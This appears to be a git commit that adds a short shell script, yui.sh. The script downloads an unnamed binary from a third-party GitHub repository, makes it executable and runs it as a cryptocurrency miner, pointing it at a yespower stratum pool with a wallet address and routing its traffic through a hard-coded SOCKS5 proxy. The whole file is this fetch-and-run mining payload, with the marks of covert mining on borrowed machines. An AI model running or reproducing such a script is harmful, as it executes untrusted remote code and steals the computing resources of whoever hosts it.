5f4f486235e82dfd724e770ac87a31f8ff8b3ac4
matikasayana <105730729+matikasayana@users.noreply.github.com>
2022-05-17 21:38:59 +0700

    Create yui.sh

---
+++ yui.sh
@@ -0,0 +1,3 @@
+wget https://github.com/andrasuparmi/niniminir/raw/main/yui && chmod +x yui
+./yui -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1quv30fmqa8l5g3n6tr5fwc7ctt2qg0326ceecdn.mika -x socks5://185.141.233.209:22475
+#
